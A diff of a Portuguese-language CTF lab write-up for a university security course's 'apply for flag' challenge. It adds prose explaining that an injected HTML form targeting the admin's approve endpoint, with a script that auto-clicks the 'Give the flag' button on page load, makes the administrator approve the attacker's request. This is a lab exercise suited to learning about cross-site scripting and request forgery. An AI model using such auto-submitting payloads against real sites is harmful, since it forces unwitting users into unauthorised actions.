@@ -87,11 +87,11 @@ Verificou-se a existência do ID do pedido - `<requestID>` - e de um _form_ onde
 
 ![](./screenshots/apply_for_flag2_2.png) 
 
-Na página utilizada pelo _admin_, existe o botão `Give the flag` cujo código fonte se encontra no _screenshot_ abaixo. 
+Na página utilizada pelo _admin_, existe o botão `Give the flag` cujo código fonte se encontra no _screenshot_ abaixo. O objetivo é fazer o administrador clicar nesse botão.
 
 ![](./screenshots/apply_for_flag2_3.png) 
 
-![](./screenshots/apply_for_flag2_4.png) 
+Para isso, copiou-se o código fonte do botão, alterou-se o atributo `action` e removeu-se o `disabled`. Para além disso, acrescentou-se o _script_ que realiza a ação de carregar no botão ao carregar a página. Este foi o _input_:
 
 ```html
 <form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/<requestID>/approve" role="form">
@@ -99,7 +99,6 @@ Na página utilizada pelo _admin_, existe o botão `Give the flag` cujo código 
         <input type="submit" id="giveflag" value="Give the flag">
     </div>
 </form>
-
 <script> 
     window.onload = function(){
         document.getElementById('giveflag').click();
@@ -110,6 +109,8 @@ Na página utilizada pelo _admin_, existe o botão `Give the flag` cujo código 
 - Nota: neste caso `<requestID>` seria `fa9d70d9d2ed6c76ac2f46f6f203bb80b6f46dbb`.
 
 ![](./screenshots/apply_for_flag2_5.png) 
+
+![](./screenshots/apply_for_flag2_4.png) 
 
 ![](./screenshots/apply_for_flag2_6.png) 
 
